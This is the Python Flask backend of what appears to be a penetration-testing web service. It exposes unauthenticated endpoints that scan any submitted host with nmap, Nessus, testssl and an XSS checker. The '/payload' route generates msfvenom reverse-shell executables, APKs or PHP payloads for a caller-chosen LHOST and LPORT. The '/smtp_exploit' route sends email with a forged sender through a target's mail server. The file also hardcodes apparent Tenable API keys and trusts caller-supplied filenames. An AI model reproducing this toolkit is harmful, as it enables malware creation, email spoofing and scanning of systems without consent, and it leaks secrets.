from flask import Flask,request,jsonify,render_template

#import sys
#sys.path.insert(0,'/whois/whoise')
#import whoisData

#whois scriptt
from whois.whois_script import *


from xss.interface import *

from testssl.interface import *

#Nessus api
from tenable_io.client import TenableIOClient
from socket import gethostbyname

#background processes call,smtp,nmap
import subprocess
from subprocess import call
import os
import nmap



app=Flask(__name__)

#Get data for whois 
@app.route('/whoiss',methods=['POST'])
def whoiss():
	req_data=request.get_json()
	targetUrl=req_data['url']
	result=whois_cal(targetUrl)
	return jsonify(result)


#Get data fro XSS
@app.route('/xss_check',methods=['POST'])
def xsss():
	req_data=request.get_json()
	targetUrl=req_data['url']
	##f=open("xssReport.txt","w")
	fileName=req_data['filename']
	#fileName=fileName+".txt"
	#with open(fileName,'w') as f:
	#	subprocess.call(["python","xsssnipertest.py","-u",targetUrl],stdout=f)
	#convert.convert_txt_pdf(fileName)
	xss_inter(targetUrl,fileName)
	
	return 'Your file is ready to Download'
		
		
#Get data for payload Generation		
@app.route('/payload',methods=['POST'])
def payLoad():
	req_data=request.get_json()
	platform=req_data['platform']
	payloadType=req_data['payloadType']
	callType=req_data['callType']
	lHost=req_data['lhost']
	lPort=req_data['lport']
	payloadName=req_data['name']
	if platform=='windows':
		payloadName=payloadName+".exe"
	elif platform=='android':
		payloadName=payloadName+".apk"
	elif platform=='php':
		payloadName=payloadName+".php"
	payloadDetail=platform+"/"+payloadType+"/"+callType
	lHost="LHOST="+lHost
	lPort="LPORT="+lPort
	with open(payloadName,'w') as f:
		subprocess.call(['msfvenom',"-p",payloadDetail,lHost,lPort],stdout=f)
	
	path_from_pdf="/home/ubuntu/website/"+payloadName
	path_to_pdf="/home/ubuntu/website/reports/payload/"+payloadName
	subprocess.call(["mv",path_from_pdf,path_to_pdf])
	return 'Your file is ready to be downloaded'
	

#Get data for testing ssl vulnerabilities
@app.route('/testssl',methods=['POST'])
def testSsl():
	req_data=request.get_json()
	testUrl=req_data['url']
	fileName=req_data['filename']
	ssl_inter(testUrl,fileName)
	'''fileName=fileName+".txt"
	with open(fileName,'w') as f:
		subprocess.call(["./testssl.sh","-U",testUrl],stdout=f)
	convert.convert_txt_pdf(fileName)'''
	return 'Your file is ready to be downloaded'
	
#Get data for running nessus scan
@app.route('/test_nessus',methods=['POST'])
def test_nessus():
	req_data=request.get_json()
	testUrl=req_data['url']
	scanName=req_data['name']
	testIp=gethostbyname(testUrl)
	reportName=scanName+".pdf"
	client = TenableIOClient(access_key='135b739644f7f56f6e39fa6f45d00ccdc199fb15793ddf324a7ad0e4526e1b95', secret_key='ff6d61f566c11479154f68dc8f0a6ebf35aa961d65329a01a41349638face336')
	scan = client.scan_helper.create(name=scanName, text_targets=testIp, template='basic')
	scan.launch().download(reportName, scan.histories()[0].history_id)
	path_from_pdf="/home/ubuntu/website/"+reportName
	path_to_pdf="/home/ubuntu/website/reports/nessus/"+reportName
	subprocess.call(["mv",path_from_pdf,path_to_pdf])
	return 'Your report has been generated' 
		
 	
 	
#smtp open relay exploitation
@app.route('/check_smtp',methods=['POST'])
def check_smtp():
	req_data=request.get_json()
	testUrl=req_data['url']
	testUrl=testUrl.replace("http://","")
	while True:
		try:
			testIp=gethostbyname(testUrl)
			return port_check(testIp)
		except socket.gaierror:
			return 'error'

def port_check(ipAddr):
	ip_str=str(ipAddr)
	nm=nmap.PortScanner()
	real_check=nm.scan(ipAddr,'22-443')
	if 25 in real_check['scan'][ip_str]['tcp']:
		if real_check['scan'][ip_str]['tcp'][25]['state']=='open':
			return jsonify(
				exploit="1"
			)
		else:
			return jsonify(
				exploit="0"
			)
	else:
		return jsonify(
			expoit="0"
		)

@app.route('/smtp_exploit',methods=['POST'])
def smtp_exploit():
	import smtplib
	import email
	from email.message import Message
	msg=email.message.Message()
	req_data=request.get_json()
	mail_from=req_data['sender']
	mail_to=req_data['recipient']
	mail_subj=req_data['subject']
	mail_body=req_data['body']
	testUrl=req_data['url']
	msg["From"]=mail_from
	msg["To"]=mail_to
	msg["Subject"]=mail_subj
	msg["body"]=mail_body
	testUrl=testUrl.replace("http://www.","")
	testUrl=testUrl.replace("www.","")
	mail_server="mail."+testUrl
	server=smtplib.SMTP(mail_server,25)
	server.starttls()
	server.ehlo_or_helo_if_needed()
	try:
		failed=server.sendmail(mail_from,mail_to,msg.as_string())
		server.close()
		return 'Mail sent successfully'
	except Exception as e:
		return 'Mail sending failed'

	
#Nmap scan
@app.route('/nmap_scan',methods=['POST'])
def nmap_scan():
	req_data=request.get_json()
	ip_addr=req_data["ip"]
	#ip_str=str(ip_addr)
	nm=nmap.PortScanner()
	real_check=nm.scan(ip_addr,"1-1024")
	#nm.scan(ip_addr,"1-1024")
	#return nm.csv()
	return jsonify(real_check)


if __name__ == '__main__':
	app.run()

